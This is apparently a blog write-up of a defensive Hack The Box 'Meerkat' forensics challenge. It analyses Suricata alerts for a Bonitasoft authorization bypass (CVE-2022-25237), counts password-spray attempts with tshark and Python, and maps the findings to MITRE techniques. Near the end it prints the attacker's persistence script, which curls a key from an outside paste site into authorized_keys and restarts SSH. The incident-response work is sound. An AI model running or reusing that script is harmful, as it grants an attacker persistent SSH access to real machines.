---
layout: page
title: Meerkat
description: Investigated PCAPs and correlated log data.
img: 
importance: 4
category: Sherlocks
team: Blue Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/meerkat/logo.png" title="HTB Meerkat" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://app.hackthebox.com/sherlocks/Meerkat">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Here we are back again with a pcap and json and trying to figure out what is going on.

First things first, let's download the box files.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/meerkat/download.png" title="Download the files" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
The first step to begin the incident response is to identify the program that is running that could have potentially been compromised.  Reviewing the logs, in some of the alerts, we see CVE-2022-25237.  This is a Bonitasoft Authorization Bypass.

{% capture findsoftware %}
<snip>
{
    "ts": "2023-01-19T15:39:17.832239Z",
    "event_type": "alert",
    "src_ip": "138.199.59.221",
    "src_port": 53401,
    "dest_ip": "172.31.6.44",
    "dest_port": 8080,
    "vlan": null,
    "proto": "TCP",
    "app_proto": "http",
    "alert": {
      "severity": 1,
      "signature": "ET EXPLOIT Bonitasoft Authorization Bypass and RCE Upload M1 (CVE-2022-25237)",
      "category": "Attempted Administrator Privilege Gain",
      "action": "allowed",
      "signature_id": 2036821,
      "gid": 1,
      "rev": 1,
      "metadata": {
        "signature_severity": [
          "Major"
        ],
        "former_category": [
          "EXPLOIT"
        ],
        "attack_target": [
          "Server"
        ],
        "deployment": [
          "SSLDecrypt",
          "Perimeter"
        ],
        "affected_product": null,
        "created_at": [
          "2022_06_03"
        ],
<snip>
{% endcapture %}
{% include terminal.html language='json' title='json' content=findsoftware %}

<br />
The next step is to identify the type of attack that we are are researching.  Since we know that this is a type of Brute Force, that is a good place to start.  We can check the MITRE for it and note the four types.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/meerkat/bruteforce.png" title="MITRE Brute Force" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://attack.mitre.org/techniques/T1110/">https://attack.mitre.org/techniques/T1110/</a>

<br />
After exploring the four subcategories, this attack looks like password spraying.  It tries multiple credential combinations until it finds a valid combination.  This matches the definition pretty much spot on.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/meerkat/passpray.png" title="MITRE Password Spray" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://attack.mitre.org/techniques/T1110/004/">https://attack.mitre.org/techniques/T1110/004/</a>

<br />
We should check the CVE catalog for the Authorization Bypass that we discovered earlier.

{% capture cvelog %}
<snip>
{
    "ts": "2023-01-19T15:39:17.832239Z",
    "event_type": "alert",
    "src_ip": "138.199.59.221",
    "src_port": 53401,
    "dest_ip": "172.31.6.44",
    "dest_port": 8080,
    "vlan": null,
    "proto": "TCP",
    "app_proto": "http",
    "alert": {
      "severity": 1,
      "signature": "ET EXPLOIT Bonitasoft Authorization Bypass and RCE Upload M1 (CVE-2022-25237)",
<snip>
{% endcapture %}
{% include terminal.html language='json' title='json' content=cvelog %}

<br />
Cool so now that have an idea of what we are dealing with, we can check the PCAP in Wireshark to find the malicious string used to bypass authentication.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/meerkat/attackstring.png" title="Attack String" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Another important step is to identify the number of login attempts in the spray.  The first step is to find all the login attempts in WireShark and export it out for further analysis.  We also need to exclude install:install logins because those are not associated with the password spray.

{% capture tsharkexport %}
┌──(kali㉿kali)-[~/Desktop]
└─$ tshark -r meerkat.pcap \
  -Y 'http.request.method == "POST" && http.request.uri contains "login" && !(frame matches "username=install")' \
  -T fields \
  -E separator=$'\t' -E occurrence=f \
  -e frame.number -e frame.time_epoch -e ip.src -e ip.dst -e http.request.uri -e http.content_type -e http.file_data \
  > posts_raw.tsv
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=tsharkexport %}

<br />
The WireShark output doesn't account for duplicates.  So we can write a python script to iterate the output and save it to a set.  Finally, output the size of the set.

{% capture analyzelogin %}
finalset = set()

with open('/home/kali/Desktop/posts_raw.tsv','r') as fs:
    for line in fs:
        hashy = line.rstrip('\n').split('\t')[-1]
        finalset.add(hashy)

print(len(finalset))
{% endcapture %}
{% include terminal.html language='python' title='python' content=analyzelogin %}

<br />
Run the script to find the number of password spray attempts.

{% capture NumberAttempts %}
============================================================================================== RESTART: /home/kali/Desktop/parse_0x00.py==============================================================================================
56
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=NumberAttempts %}

<br />
Then, we can analyze the WireShark to find the one that is successful.  So, scrolling to the bottom we can see a login request that returns a 204 instead of 401.  This is our request.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/meerkat/validlogin.png" title="Valid Login" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
We should probably figure out where they are hosting the malicious file that they download.  Reviewing the traffic in WireShark, we can see a wget command that shows what they downloaded.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/meerkat/pastesio.png" title="Download Link" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Since it is posted, we can then view the script, see what it does, which files and folders it modifies, and what its name is.

{% capture t_bash %}
#!/bin/bash
curl https://pastes.io/raw/hffgra4unv >> /home/ubuntu/.ssh/authorized_keys
sudo service ssh restart
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=t_bash %}
<a href="https://pastes.io/raw/bx5gcr0et8">https://pastes.io/raw/bx5gcr0et8</a>

<br />
The final step for this investigation is to confirm the technique ID of the persistence mechanism.  Since we are manipulating authorized keys, we can search the MITRE framework for authorized keys.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/meerkat/sshmitre.png" title="SSH Authorized Keys" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://attack.mitre.org/techniques/T1098/004/">https://attack.mitre.org/techniques/T1098/004/</a>

<br />
And with that, we wrapped up another box.  Hopefully, you enjoyed the read.  See you in the next one.